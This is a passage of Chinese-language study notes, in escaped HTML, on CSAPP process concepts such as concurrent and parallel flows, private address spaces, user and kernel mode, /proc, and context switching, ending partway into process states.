\u63a5\u7740\u8fd0\u884c\u76f4\u5230\u5b8c\u6210\u3002\u6700\u540e\uff0c\u8fdb\u7a0b C \u53ef\u4ee5\u8fd0\u884c\u5230\u7ed3\u675f\u3002</p> <p>\u5173\u952e\u70b9\u5728\u4e8e\u8fdb\u7a0b\u662f\u8f6e\u6d41\u4f7f\u7528\u5904\u7406\u5668\u7684\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u6267\u884c\u5b83\u7684\u6d41\u7684\u4e00\u90e8\u5206\uff0c\u7136\u540e\u88ab \u62a2\u5360\uff08preempted\uff09\uff08\u6682\u65f6\u6302\u8d77\uff09\uff0c\u7136\u540e\u8f6e\u5230\u5176\u4ed6\u8fdb\u7a0b\u3002</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u8fd0\u884c\u5728\u8fd9\u4e9b\u8fdb\u7a0b\u4e4b\u4e00\u7684\u4e0a\u4e0b\u6587\u4e2d\u7684\u7a0b\u5e8f\uff0c\u5b83\u770b\u4e0a\u53bb\u5c31\u50cf\u662f\u5728\u72ec\u5360\u5730\u4f7f\u7528\u5904\u7406\u5668\u3002</p> <p>\u552f\u4e00\u7684\u53cd\u9762\u4f8b\u8bc1\u662f\uff0c\u5982\u679c\u6211\u4eec\u7cbe\u786e\u5730\u6d4b\u91cf\u6bcf\u6761\u6307\u4ee4\u4f7f\u7528\u7684\u65f6\u95f4\uff0c\u4f1a\u53d1\u73b0\u5728\u7a0b\u5e8f\u4e2d\u4e00\u4e9b\u6307\u4ee4\u7684\u6267\u884c\u4e4b\u95f4\uff0cCPU \u597d\u50cf\u4f1a\u5468\u671f\u6027\u5730\u505c\u987f \u3002\u7136\u800c\uff0c\u6bcf\u6b21\u5904\u7406\u5668\u505c\u987f\uff0c\u5b83\u968f\u540e\u4f1a\u7ee7\u7eed\u6267\u884c\u6211\u4eec\u7684\u7a0b\u5e8f\uff0c\u5e76\u4e0d\u6539\u53d8\u7a0b\u5e8f\u5185\u5b58\u4f4d\u7f6e\u6216\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u3002</p> <p>\u4e8c\u3001\u5e76\u53d1\u6d41</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf\u4e2d\u903b\u8f91\u6d41\u6709\u8bb8\u591a\u4e0d\u540c\u7684\u5f62\u5f0f\u3002\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3001\u8fdb\u7a0b\u3001\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u3001\u7ebf\u7a0b\u548c Java \u8fdb\u7a0b\u90fd\u662f\u903b\u8f91\u6d41\u7684\u4f8b\u5b50\u3002</p> <p>\u4e00\u4e2a\u903b\u8f91\u6d41\u7684\u6267\u884c\u5728\u65f6\u95f4\u4e0a\u4e0e\u53e6\u4e00\u4e2a\u6d41\u91cd\u53e0\uff0c\u79f0\u4e3a \u5e76\u53d1\u6d41\uff08concurrent flow\uff09\uff0c\u8fd9\u4e24\u4e2a\u6d41\u88ab\u79f0\u4e3a \u5e76\u53d1\u5730\u8fd0\u884c\u3002</p> <p>\u5728\u4e0a\u56fe\u4e2d\uff0c\u8fdb\u7a0b AB \u5e76\u53d1\u8fd0\u884c\u3001AC \u5e76\u53d1\u8fd0\u884c\uff0c\u4f46 BC \u6ca1\u6709\u5e76\u53d1\u5730\u8fd0\u884c\uff0c\u56e0\u4e3a B \u7684\u6700\u540e\u4e00\u6761\u6307\u4ee4\u5728 C \u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u4e4b\u524d\u6267\u884c\u3002</p> <p>\u4e00\u4e2a\u8fdb\u7a0b\u548c\u5176\u4ed6\u8fdb\u7a0b\u8f6e\u6d41\u8fd0\u884c\u7684\u6982\u5ff5\u79f0\u4e3a \u591a\u4efb\u52a1\uff08multitasking\uff09\u3002\u4e00\u4e2a\u8fdb\u7a0b\u6267\u884c\u5b83\u7684\u63a7\u5236\u6d41\u7684\u4e00\u90e8\u5206\u7684\u6bcf\u4e00\u65f6\u95f4\u6bb5\u53eb\u505a \u65f6\u95f4\u7247 \uff08time slice\uff09\u3002\u56e0\u6b64\uff0c\u591a\u4efb\u52a1\u4e5f\u53eb\u505a \u65f6\u95f4\u5206\u7247\uff08timeslicing\uff09\u3002\u4f8b\u5982\u4e0a\u56fe\u4e2d\u7684\u8fdb\u7a0b A \u7684\u6d41\u7531\u4e24\u4e2a\u65f6\u95f4\u7247\u7ec4\u6210\u3002</p> <p>\u6ce8\u610f\uff0c\u5e76\u53d1\u6d41\u7684\u601d\u60f3\u4e0e\u6d41\u8fd0\u884c\u7684\u5904\u7406\u5668\u6838\u6570\u6216\u8005\u8ba1\u7b97\u673a\u6570\u65e0\u5173\u3002\u5982\u679c\u4e24\u4e2a\u6d41\u5728\u65f6\u95f4\u4e0a\u91cd\u53e0\uff0c\u90a3\u4e48\u5b83\u4eec\u5c31\u662f\u5e76\u53d1\u7684\uff0c\u5373\u4f7f\u5b83\u4eec\u662f\u8fd0\u884c\u5728\u540c\u4e00\u4e2a\u5904\u7406\u5668\u4e0a\u3002\u4e0d\u8fc7\uff0c\u6709\u65f6\u6211\u4eec\u4f1a\u53d1\u73b0\u786e\u8ba4\u5e76\u884c\u6d41\u662f\u5f88\u6709\u5e2e\u52a9\u7684\uff0c\u5b83\u662f\u5e76\u53d1\u6d41\u7684\u4e00\u4e2a\u771f\u5b50\u96c6\u3002 \u5982\u679c\u4e24\u4e2a\u6d41\u5e76\u53d1\u5730\u8fd0\u884c\u5728\u4e0d\u540c\u7684\u5904\u7406\u5668\u6838\u6216\u8005\u8ba1\u7b97\u673a\u4e0a\uff0c\u90a3\u4e48\u6211\u4eec\u79f0\u5b83\u4eec\u4e3a \u5e76\u884c\u6d41\uff08parallel flow\uff09\uff0c\u5b83\u4eec \u5e76\u884c\u5730\u8fd0\u884c \uff08running in parallel\uff09\uff0c\u4e14 \u5e76\u884c\u5730\u6267\u884c\uff08parallel execution\uff09\u3002</p> <p>\u4e09\u3001\u79c1\u6709\u5730\u5740\u7a7a\u95f4</p> <p>\u8fdb\u7a0b\u4e5f\u4e3a\u6bcf\u4e2a\u7a0b\u5e8f\u63d0\u4f9b\u4e00\u79cd\u5047\u8c61\uff0c\u597d\u50cf\u5b83\u72ec\u5360\u5730\u4f7f\u7528\u7cfb\u7edf\u5730\u5740\u7a7a\u95f4\u3002\u5728\u4e00\u53f0 n \u4f4d\u5730\u5740\u7684\u673a\u5668\u4e0a\uff0c\u5730\u5740\u7a7a\u95f4\u662f \\(2^n\\) \u4e2a\u53ef\u80fd\u5730\u5740\u7684\u96c6\u5408\uff0c0\uff0c1\uff0c\u22ef\uff0c\\(2^n -1\\) \u3002\u8fdb\u7a0b\u4e3a\u6bcf\u4e2a\u7a0b\u5e8f\u63d0\u4f9b\u5b83\u81ea\u5df1\u7684 \u79c1\u6709\u5730\u5740\u7a7a\u95f4\u3002\u4e00\u822c\u800c\u8a00\uff0c\u548c\u8fd9\u4e2a\u7a7a\u95f4\u4e2d\u67d0\u4e2a\u5730\u5740\u76f8\u5173\u8054\u7684\u90a3\u4e2a\u5185\u5b58\u5b57\u8282\u662f\u4e0d\u80fd\u88ab\u5176\u4ed6\u8fdb\u7a0b\u8bfb\u6216\u8005\u5199\u7684\uff0c\u4ece\u8fd9\u4e2a\u610f\u4e49\u4e0a\u8bf4\uff0c\u8fd9\u4e2a\u5730\u5740\u7a7a\u95f4\u662f\u79c1\u6709\u7684\u3002</p> <p>\u5c3d\u7ba1\u548c\u6bcf\u4e2a\u79c1\u6709\u5730\u5740\u7a7a\u95f4\u76f8\u5173\u8054\u7684\u5185\u5b58\u7684\u5185\u5bb9\u4e00\u822c\u662f\u4e0d\u540c\u7684\uff0c\u4f46\u662f\u6bcf\u4e2a\u8fd9\u6837\u7684\u7a7a\u95f4\u90fd\u6709\u76f8\u540c\u7684\u901a\u7528\u7ed3\u6784\u3002</p> <p>\u4e0b\u56fe\u5c55\u793a\u4e86\u4e00\u4e2a x86-64 Linux \u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u7684\u7ec4\u7ec7\u7ed3\u6784\u3002</p> <p></p> <p>\u5730\u5740\u7a7a\u95f4\u5e95\u90e8\u662f\u4fdd\u7559\u7ed9\u7528\u6237\u7a0b\u5e8f\u7684\uff0c\u5305\u62ec\u901a\u5e38\u7684\u4ee3\u7801\u3001\u6570\u636e\u3001\u5806\u548c\u6808\u6bb5\u3002\u4ee3\u7801\u6bb5\u603b\u662f\u4ece\u5730\u5740 0x400000 \u5f00\u59cb\u3002\u5730\u5740\u7a7a\u95f4\u9876\u90e8\u4fdd\u7559\u7ed9\u5185\u6838\uff08\u64cd\u4f5c\u7cfb\u7edf\u5e38\u9a7b\u5185\u5b58\u7684\u90e8\u5206\uff09\u3002\u5730\u5740\u7a7a\u95f4\u7684\u8fd9\u4e2a\u90e8\u5206\u5305\u542b\u5185\u6838\u5728\u4ee3\u8868\u8fdb\u7a0b\u6267\u884c\u6307\u4ee4\u65f6\uff08\u6bd4\u5982\u5f53\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u65f6\uff09\u4f7f\u7528\u7684\u4ee3\u7801\u3001\u6570\u636e\u548c\u6808\u3002</p> <p>\u5728 X86 \u4e2d\u901a\u5e38\u4ece 0x08048000 \u5f00\u59cb\uff0c\u800c 0x0 - 0x08048000 \u4e3a\u672a\u4f7f\u7528\uff0c\u8be5\u6570\u5b57\u7531\u94fe\u63a5\u5668\u51b3\u5b9a\uff0c\u5f53\u7136\u53ef\u4ee5\u4fee\u6539\uff0c\u4f46\u4e00\u822c\u90fd\u4e0d\u6539\u3002</p> <p>\u56db\u3001\u7528\u6237\u6a21\u5f0f\u548c\u5185\u6838\u6a21\u5f0f</p> <p>\u4e3a\u4e86\u4f7f\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u63d0\u4f9b\u4e00\u4e2a\u65e0\u61c8\u53ef\u51fb\u7684\u8fdb\u7a0b\u62bd\u8c61\uff0c\u5904\u7406\u5668\u5fc5\u987b\u63d0\u4f9b\u4e00\u79cd\u673a\u5236\uff0c\u9650\u5236\u4e00\u4e2a\u5e94\u7528\u53ef\u4ee5\u6267\u884c\u7684\u6307\u4ee4\u4ee5\u53ca\u5b83\u53ef\u4ee5\u8bbf\u95ee\u7684\u5730\u5740\u7a7a\u95f4\u8303\u56f4\u3002</p> <p>\u5904\u7406\u5668\u901a\u5e38\u662f\u7528\u67d0\u4e2a\u63a7\u5236\u5bc4\u5b58\u5668\u4e2d\u7684\u4e00\u4e2a \u6a21\u5f0f\u4f4d\uff08mode bit\uff09\u6765\u63d0\u4f9b\u8fd9\u79cd\u529f\u80fd\u7684\uff0c\u8be5\u5bc4\u5b58\u5668\u63cf\u8ff0\u4e86\u8fdb\u7a0b\u5f53\u524d\u4eab\u6709\u7684\u7279\u6743\u3002\u5f53\u8bbe\u7f6e\u4e86\u6a21\u5f0f\u4f4d\u65f6\uff0c\u8fdb\u7a0b\u5c31\u8fd0\u884c\u5728 \u5185\u6838\u6a21\u5f0f \u4e2d\uff08\u6709\u65f6\u53eb\u505a \u8d85\u7ea7\u7528\u6237\u6a21\u5f0f\uff09\u3002\u4e00\u4e2a\u8fd0\u884c\u5728\u5185\u6838\u6a21\u5f0f\u7684\u8fdb\u7a0b\u53ef\u4ee5\u6267\u884c\u6307\u4ee4\u96c6\u4e2d\u7684\u4efb\u4f55\u6307\u4ee4\uff0c\u5e76\u4e14\u53ef\u4ee5\u8bbf\u95ee\u7cfb\u7edf\u4e2d\u7684\u4efb\u4f55\u5185\u5b58\u4f4d\u7f6e\u3002</p> <p>\u6ca1\u6709\u8bbe\u7f6e\u6a21\u5f0f\u4f4d\u65f6\uff0c\u8fdb\u7a0b\u5c31\u8fd0\u884c\u5728\u7528\u6237\u6a21\u5f0f\u4e2d\u3002\u7528\u6237\u6a21\u5f0f\u4e2d\u7684\u8fdb\u7a0b\u4e0d\u5141\u8bb8\u6267\u884c \u7279\u6743\u6307\u4ee4\uff08privileged instruction\uff09\uff0c\u6bd4\u5982\u505c\u6b62\u5904\u7406\u5668\u3001\u6539\u53d8\u6a21\u5f0f\u4f4d\uff0c\u6216\u8005\u53d1\u8d77\u4e00\u4e2a I/O \u64cd\u4f5c\u3002\u4e5f\u4e0d\u5141\u8bb8\u7528\u6237\u6a21\u5f0f\u4e2d\u7684\u8fdb\u7a0b\u76f4\u63a5\u5f15\u7528\u5730\u5740\u7a7a\u95f4\u4e2d\u5185\u6838\u533a\u5185\u7684\u4ee3\u7801\u548c\u6570\u636e\u3002\u4efb\u4f55\u8fd9\u6837\u7684\u5c1d\u8bd5\u90fd\u4f1a\u5bfc\u81f4\u81f4\u547d\u7684\u4fdd\u62a4\u6545\u969c\u3002\u53cd\u4e4b\uff0c\u7528\u6237\u7a0b\u5e8f\u5fc5\u987b\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u63a5\u53e3\u95f4\u63a5\u5730\u8bbf\u95ee\u5185\u6838\u4ee3\u7801\u548c\u6570\u636e\u3002</p> <p>\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\u4ee3\u7801\u7684\u8fdb\u7a0b\u521d\u59cb\u65f6\u662f\u5728\u7528\u6237\u6a21\u5f0f\u4e2d\u7684\u3002\u8fdb\u7a0b\u4ece\u7528\u6237\u6a21\u5f0f\u53d8\u4e3a\u5185\u6838\u6a21\u5f0f\u7684\u552f\u4e00\u65b9\u6cd5\u662f\u901a\u8fc7\u8bf8\u5982\u4e2d\u65ad\u3001\u6545\u969c\u6216\u8005\u9677\u5165\u7cfb\u7edf\u8c03\u7528\u8fd9\u6837\u7684\u5f02\u5e38\u3002 \u5f53\u5f02\u5e38\u53d1\u751f\u65f6\uff0c\u63a7\u5236\u4f20\u9012\u5230\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u5904\u7406\u5668\u5c06\u6a21\u5f0f\u4ece\u7528\u6237\u6a21\u5f0f\u53d8\u4e3a\u5185\u6838\u6a21\u5f0f\u3002\u5904\u7406\u7a0b\u5e8f\u8fd0\u884c\u5728\u5185\u6838\u6a21\u5f0f\u4e2d\uff0c\u5f53\u5b83\u8fd4\u56de\u5230\u5e94\u7528\u7a0b\u5e8f\u4ee3\u7801\u65f6\uff0c\u5904\u7406\u5668\u5c31\u628a\u6a21\u5f0f\u4ece\u5185\u6838\u6a21\u5f0f\u6539\u56de\u5230\u7528\u6237\u6a21\u5f0f\u3002</p> <p>Linux \u63d0\u4f9b\u4e86\u4e00\u79cd\u806a\u660e\u7684\u673a\u5236\uff0c\u53eb\u505a /proc \u6587\u4ef6\u7cfb\u7edf\uff0c\u5b83\u5141\u8bb8\u7528\u6237\u6a21\u5f0f\u8fdb\u7a0b\u8bbf\u95ee\u5185\u6838\u6570\u636e\u7ed3\u6784\u7684\u5185\u5bb9\u3002/proc \u6587\u4ef6\u7cfb\u7edf\u5c06\u8bb8\u591a\u5185\u6838\u6570\u636e\u7ed3\u6784\u7684\u5185\u5bb9\u8f93\u51fa\u4e3a\u4e00\u4e2a\u7528\u6237\u7a0b\u5e8f\u53ef\u4ee5\u8bfb\u7684\u6587\u672c\u6587\u4ef6\u7684\u5c42\u6b21\u7ed3\u6784\u3002\u6bd4\u5982\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 / proc \u6587\u4ef6\u7cfb\u7edf\u627e\u51fa\u4e00\u822c\u7684\u7cfb\u7edf\u5c5e\u6027\uff0c\u6bd4\u5982 CPU \u7c7b\u578b\uff08/proc/cpuinfo\uff09\uff0c\u6216\u8005\u67d0\u4e2a\u7279\u6b8a\u7684\u8fdb\u7a0b\u4f7f\u7528\u7684\u5185\u5b58\u6bb5\uff08/proc/\\/maps\uff09\u30022.6 \u7248\u672c\u7684 Linux \u5185\u6838\u5f15\u5165 /sys \u6587\u4ef6\u7cfb\u7edf\uff0c\u5b83\u8f93\u5c80\u5173\u4e8e\u7cfb\u7edf\u603b\u7ebf\u548c\u8bbe\u5907\u7684\u989d\u5916\u7684\u4f4e\u5c42\u4fe1\u606f\u3002 <p>\u4e94\u3001\u4e0a\u4e0b\u6587\u5207\u6362</p> <p>\u73b0\u5728\u6211\u4eec\u77e5\u9053\u6bcf\u4e2a\u8fdb\u7a0b\u6709\u81ea\u5df1\u7684\u79c1\u6709\u5730\u5740\u7a7a\u95f4\uff0c\u4e14\u591a\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u5e76\u53d1\u7684\u8fd0\u884c\u3002</p> <p>\u6ce8\u610f\u5230\uff0c\u5f53\u67d0\u4e2a\u8fdb\u7a0b\u7684\u65f6\u95f4\u7247\u8fd0\u884c\u5b8c\u6bd5\u540e\uff0cCPU \u4f1a\u8f6c\u800c\u53bb\u6267\u884c\u53e6\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u4f46 CPU \u7684\u5bc4\u5b58\u5668\u7b49\u6570\u636e\u5374\u53ea\u6709\u4e00\u5957\uff0c\u90a3\u4e48\u5982\u4f55\u4fdd\u8bc1\u5728\u591a\u4efb\u52a1\u6267\u884c\u7684\u65f6\u5019\uff0c\u6570\u636e\u7684\u5b89\u5168\u4e0e\u6b63\u786e\u5462\uff1f</p> <p>\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u4f7f\u7528\u4e00\u79cd\u79f0\u4e3a \u4e0a\u4e0b\u6587\u5207\u6362\uff08context switch\uff09\u7684\u8f83\u9ad8\u5c42\u5f62\u5f0f\u7684\u5f02\u5e38\u63a7\u5236\u6d41\u6765\u5b9e\u73b0\u591a\u4efb\u52a1\u3002</p> <p>\u5185\u6838\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u7ef4\u6301\u4e00\u4e2a \u4e0a\u4e0b\u6587\uff08context\uff09\uff0c\u4e0a\u4e0b\u6587\u5c31\u662f\u5185\u6838\u91cd\u65b0\u542f\u52a8\u4e00\u4e2a\u88ab\u62a2\u5360\u7684\u8fdb\u7a0b\u6240\u9700\u7684\u72b6\u6001\uff0c\u5176\u5185\u5bb9\u5305\u62ec\uff1a</p> <ul> <li>\u901a\u7528\u76ee\u7684\u5bc4\u5b58\u5668\u3001\u6d6e\u70b9\u5bc4\u5b58\u5668\u3001\u7a0b\u5e8f\u8ba1\u6570\u5668\u3001\u7528\u6237\u6808\u3001\u72b6\u6001\u5bc4\u5b58\u5668\u3001\u5185\u6838\u6808</li> <li>\u5404\u79cd\u5185\u6838\u6570\u636e\u7ed3\u6784\uff0c\u6bd4\u5982\u63cf\u8ff0\u5730\u5740\u7a7a\u95f4\u7684\u9875\u8868\u3001\u5305\u542b\u6709\u5173\u5f53\u524d\u8fdb\u7a0b\u4fe1\u606f\u7684\u8fdb\u7a0b\u8868\uff0c\u4ee5\u53ca\u5305\u542b\u8fdb\u7a0b\u5df2\u6253\u5f00\u6587\u4ef6\u7684\u4fe1\u606f\u7684\u6587\u4ef6\u8868</li> </ul> <p>\u2460 \u5728\u8fdb\u7a0b\u6267\u884c\u7684\u67d0\u4e9b\u65f6\u523b\uff0c\u5185\u6838\u53ef\u4ee5\u51b3\u5b9a\u62a2\u5360\u5f53\u524d\u8fdb\u7a0b\uff0c\u5e76\u91cd\u65b0\u5f00\u59cb\u4e00\u4e2a\u5148\u524d\u88ab\u62a2\u5360\u4e86\u7684\u8fdb\u7a0b\u3002\u8fd9\u79cd\u51b3\u7b56\u5c31\u53eb\u505a \u8c03\u5ea6 \uff08scheduling\uff09\uff0c\u662f\u7531\u5185\u6838\u4e2d\u79f0\u4e3a \u8c03\u5ea6\u5668\uff08scheduler\uff09\u7684\u4ee3\u7801\u5904\u7406\u7684\u3002</p> <p>\u5f53\u5185\u6838\u9009\u62e9\u4e00\u4e2a\u65b0\u7684\u8fdb\u7a0b\u8fd0\u884c\u65f6\uff0c\u6211\u4eec\u8bf4\u5185\u6838\u8c03\u5ea6\u4e86\u8fd9\u4e2a\u8fdb\u7a0b\u3002\u5728\u5185\u6838\u8c03\u5ea6\u4e86\u4e00\u4e2a\u65b0\u7684\u8fdb\u7a0b\u8fd0\u884c\u540e\uff0c\u5b83\u5c31\u62a2\u5360\u5f53\u524d\u8fdb\u7a0b\uff0c\u5e76\u4f7f\u7528\u4e00\u79cd\u79f0\u4e3a\u4e0a\u4e0b\u6587\u5207\u6362\u7684\u673a\u5236\u6765\u5c06\u63a7\u5236\u8f6c\u79fb\u5230\u65b0\u7684\u8fdb\u7a0b\uff1a</p> <ul> <li>\u4fdd\u5b58\u5f53\u524d\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587</li> <li>\u6062\u590d\u67d0\u4e2a\u5148\u524d\u88ab\u62a2\u5360\u7684\u8fdb\u7a0b\u88ab\u4fdd\u5b58\u7684\u4e0a\u4e0b\u6587</li> <li>\u5c06\u63a7\u5236\u4f20\u9012\u7ed9\u8fd9\u4e2a\u65b0\u6062\u590d\u7684\u8fdb\u7a0b\u3002</li> </ul> <p>\u2461 \u5f53\u5185\u6838\u4ee3\u8868\u7528\u6237\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u65f6\uff0c\u53ef\u80fd\u4f1a\u53d1\u751f\u4e0a\u4e0b\u6587\u5207\u6362\u3002\u5982\u679c\u7cfb\u7edf\u8c03\u7528\u56e0\u4e3a\u7b49\u5f85\u67d0\u4e2a\u4e8b\u4ef6\u53d1\u751f\u800c\u963b\u585e\uff0c\u90a3\u4e48\u5185\u6838\u53ef\u4ee5\u8ba9\u5f53\u524d\u8fdb\u7a0b\u4f11\u7720\uff0c\u5207\u6362\u5230\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u3002</p> <p>\u6bd4\u5982\uff0c\u5982\u679c\u4e00\u4e2a read \u7cfb\u7edf\u8c03\u7528\u9700\u8981\u8bbf\u95ee\u78c1\u76d8\uff0c\u5185\u6838\u53ef\u4ee5\u9009\u62e9\u6267\u884c\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u8fd0\u884c\u53e6\u5916\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u800c\u4e0d\u662f\u7b49\u5f85\u6570\u636e\u4ece\u78c1\u76d8\u5230\u8fbe\u3002\u53e6\u4e00\u4e2a\u793a\u4f8b\u662f sleep \u7cfb\u7edf\u8c03\u7528\uff0c\u5b83\u663e\u5f0f\u5730\u8bf7\u6c42\u8ba9\u8c03\u7528\u8fdb\u7a0b\u4f11\u7720\u3002\u4e00\u822c\u800c\u8a00\uff0c\u5373\u4f7f\u7cfb\u7edf\u8c03\u7528\u6ca1\u6709\u963b\u585e\uff0c\u5185\u6838\u4e5f\u53ef\u4ee5\u51b3\u5b9a\u6267\u884c\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u800c\u4e0d\u662f\u5c06\u63a7\u5236\u8fd4\u56de\u7ed9\u8c03\u7528\u8fdb\u7a0b\u3002</p> <p>\u2462 \u4e2d\u65ad\u4e5f\u53ef\u80fd\u5f15\u53d1\u4e0a\u4e0b\u6587\u5207\u6362\u3002</p> <p>\u6bd4\u5982\uff0c\u6240\u6709\u7684\u7cfb\u7edf\u90fd\u6709\u67d0\u79cd\u4ea7\u751f\u5468\u671f\u6027\u5b9a\u65f6\u5668\u4e2d\u65ad\u7684\u673a\u5236\uff0c\u901a\u5e38\u4e3a\u6bcf 1 \u6beb\u79d2\u6216\u6bcf 10 \u6beb\u79d2\u3002\u6bcf\u6b21\u53d1\u751f\u5b9a\u65f6\u5668\u4e2d\u65ad\u65f6\uff0c\u5185\u6838\u5c31\u80fd\u5224\u5b9a\u5f53\u524d\u8fdb\u7a0b\u5df2\u7ecf\u8fd0\u884c\u4e86\u8db3\u591f\u957f\u7684\u65f6\u95f4\uff0c\u5e76\u5207\u6362\u5230\u4e00\u4e2a\u65b0\u7684\u8fdb\u7a0b\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\u7684\u4e0a\u4e0b\u6587\u5207\u6362\u6848\u4f8b\uff0c\u8fdb\u7a0b A \u521d\u59cb\u8fd0\u884c\u5728\u7528\u6237\u6a21\u5f0f\u4e2d\uff0c\u76f4\u5230\u5b83\u901a\u8fc7\u6267\u884c\u7cfb\u7edf\u8c03\u7528 read \u9677\u5165\u5230\u5185\u6838\u3002\u5185\u6838\u4e2d\u7684\u9677\u9631\u5904\u7406\u7a0b\u5e8f\u8bf7\u6c42\u6765\u81ea\u78c1\u76d8\u63a7\u5236\u5668\u7684 DMA \u4f20\u8f93\uff0c\u5e76\u4e14\u5b89\u6392\u5728\u78c1\u76d8\u63a7\u5236\u5668\u5b8c\u6210\u4ece\u78c1\u76d8\u5230\u5185\u5b58\u7684\u6570\u636e\u4f20\u8f93\u540e\uff0c\u78c1\u76d8\u4e2d\u65ad\u5904\u7406\u5668\u3002</p> <p>\u78c1\u76d8\u53d6\u6570\u636e\u8981\u7528\u4e00\u6bb5\u76f8\u5bf9\u8f83\u957f\u7684\u65f6\u95f4\uff08\u6570\u91cf\u7ea7\u4e3a\u51e0\u5341\u6beb\u79d2\uff09\uff0c\u6240\u4ee5\u5185\u6838\u6267\u884c\u4ece\u8fdb\u7a0b A \u5230\u8fdb\u7a0b B \u7684\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u800c\u4e0d\u662f\u5728\u8fd9\u4e2a\u95f4\u6b47\u65f6\u95f4\u5185\u7b49\u5f85\uff0c\u4ec0\u4e48\u90fd\u4e0d\u505a\u3002\u6ce8\u610f\u5728\u5207\u6362\u4e4b\u524d\uff0c\u5185\u6838\u6b63\u4ee3\u8868\u8fdb\u7a0b A \u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u6267\u884c\u6307\u4ee4\uff08\u5373\u6ca1\u6709\u5355\u72ec\u7684\u5185\u6838\u8fdb\u7a0b\uff09\u3002\u5728\u5207\u6362\u7684\u7b2c\u4e00\u90e8\u5206\u4e2d\uff0c\u5185\u6838\u4ee3\u8868\u8fdb\u7a0b A \u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u6267\u884c\u6307\u4ee4\u3002\u7136\u540e\u5728\u67d0\u4e00\u65f6\u523b\uff0c\u5b83\u5f00\u59cb\u4ee3\u8868\u8fdb\u7a0b B\uff08\u4ecd\u7136\u662f\u5185\u6838\u6a21\u5f0f\u4e0b\uff09\u6267\u884c\u6307\u4ee4\u3002\u5728\u5207\u6362\u4e4b\u540e\uff0c\u5185\u6838\u4ee3\u8868\u8fdb\u7a0b B \u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u6267\u884c\u6307\u4ee4\u3002</p> <p>\u968f\u540e\uff0c\u8fdb\u7a0b B \u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u8fd0\u884c\u4e00\u4f1a\u513f\uff0c\u76f4\u5230\u78c1\u76d8\u53d1\u51fa\u4e00\u4e2a\u4e2d\u65ad\u4fe1\u53f7\uff0c\u8868\u793a\u6570\u636e\u5df2\u7ecf\u4ece\u78c1\u76d8\u4f20\u9001\u5230\u4e86\u5185\u5b58\u3002\u5185\u6838\u5224\u5b9a\u8fdb\u7a0b B \u5df2\u7ecf\u8fd0\u884c\u4e86\u8db3\u591f\u957f\u7684\u65f6\u95f4\uff0c\u5c31\u6267\u884c\u4e00\u4e2a\u4ece\u8fdb\u7a0b B \u5230\u8fdb\u7a0b A \u7684\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u5c06\u63a7\u5236\u8fd4\u56de\u7ed9\u8fdb\u7a0b A \u4e2d\u7d27\u968f\u5728\u7cfb\u7edf\u8c03\u7528 read \u4e4b\u540e\u7684\u90a3\u6761\u6307\u4ee4\u3002\u8fdb\u7a0b A \u7ee7\u7eed\u8fd0\u884c\uff0c\u76f4\u5230\u4e0b\u4e00\u6b21\u5f02\u5e38\u53d1\u751f\uff0c\u4f9d\u6b64\u7c7b\u63a8\u3002</p> <p>\u516d\u3001Linux \u8fdb\u7a0b\u63a7\u5236</p> <p>Linux \u63d0\u4f9b\u4e86\u5927\u91cf\u4ece C \u7a0b\u5e8f\u4e2d\u64cd\u4f5c\u8fdb\u7a0b\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u5305\u62ec\uff1a\u83b7\u53d6\u8fdb\u7a0b ID\u3001\u521b\u5efa\u548c\u7ec8\u6b62\u8fdb\u7a0b\u3001\u56de\u6536\u5b50\u8fdb\u7a0b\u3001\u8ba9\u8fdb\u7a0b\u4f11\u7720\u3001\u52a0\u8f7d\u5e76\u8fd0\u884c\u8fdb\u7a0b\u3002</p> <p>\u5177\u4f53\u53c2\u8003 CSAPP 513\uff0c\u672c\u7b14\u8bb0\u4ec5\u5bf9\u7b14\u8005\u8ba4\u4e3a\u7684\u91cd\u70b9\u6982\u5ff5\u8fdb\u884c\u4ecb\u7ecd\u3002</p> <p>\u8fdb\u7a0b\u603b\u662f\u5904\u4e8e\u4e0b\u9762\u4e09\u79cd\u72b6\u6001\u4e4b\u4e00\uff1a</p> <ul> <li>\u8fd0\u884c\u3002 \u8fdb\u7a0b\u8981\u4e48\u5728 CPU \u4e0a \u6267\u884c\uff0c\u8981\u4e48\u5728\u7b49\u5f85\u88ab\u6267\u884c\u4e14\u6700\u7ec8\u4f1a\u88ab\u5185\u6838\u8c03\u5ea6\u3002</li> <li>\u505c\u6b62\u3002 \u8fdb\u7a0b\u7684\u6267\u884c\u88ab\u6302\u8d77\uff08suspended\uff09\uff0c\u4e14\u4e0d\u4f1a\u88ab\u8c03\u5ea6\u3002\u5f53\u6536\u5230 SIGSTOP\u3001SIGTSTP\u3001SIGTTIN \u6216\u8005 SIGTTOU 